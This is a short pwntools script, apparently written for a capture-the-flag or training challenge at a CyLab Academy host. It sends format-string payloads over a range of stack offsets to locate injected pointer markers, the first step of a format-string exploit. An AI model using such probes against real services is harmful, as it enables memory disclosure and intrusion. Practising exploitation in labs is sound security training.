from pwn import *

context.log_level = 'error'

# Coloca marcadores únicos no final do payload para acharmos o offset exato dos ponteiros
marker = p64(0x4141414141414141) + p64(0x4242424242424242)

for i in range(15, 31):
    try:
        io = remote('chatelaine.cylabacademy.net', 23933, timeout=2)
        payload = f"AAAA%{i}$pBBBB".encode() + marker
        io.sendlineafter(b"What do you have to say?\n", payload)
        res = io.recvall(timeout=2)
        print(f"Offset {i:2d}: {res.decode('utf-8', errors='ignore').strip()}")
        io.close()
    except Exception:
        io.close()